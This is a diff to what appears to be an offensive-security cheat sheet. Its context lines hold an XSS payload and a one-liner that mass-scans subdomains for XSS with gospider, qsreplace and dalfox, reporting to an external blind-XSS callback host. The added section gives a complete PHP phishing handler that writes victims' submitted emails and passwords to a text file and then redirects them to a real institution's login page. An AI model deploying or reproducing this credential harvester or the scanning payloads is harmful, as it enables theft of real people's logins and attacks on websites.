@@ -84,3 +84,20 @@ flkdflkjslkf"><img%20src=x%20onmouseover=confirm(1)>
 # 1linerXSS
 
     gospider -S subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox -b astutehacker.xss.ht pipe -o result3.txt
+
+#phishing 
+make proccess.php and give process.php to action=/process.php
+content of process.php
+```
+<?php
+if(isset($_POST['email']) && isset($_POST['password'])) {
+    $password = file_get_contents('phishing.txt');
+    $phishing = fopen("phishing.txt", "a");
+    fwrite($phishing, $password."email: ".$_POST['email']." Password: ".$_POST['password']."\n");
+    fclose($phishing);
+    echo '<script>window.location.href="https://su.icloudems.com/corecampus/index.php" </script>';
+} else {
+    echo '<script>window.location.href="index.html"</script>';
+}
+?>
+```
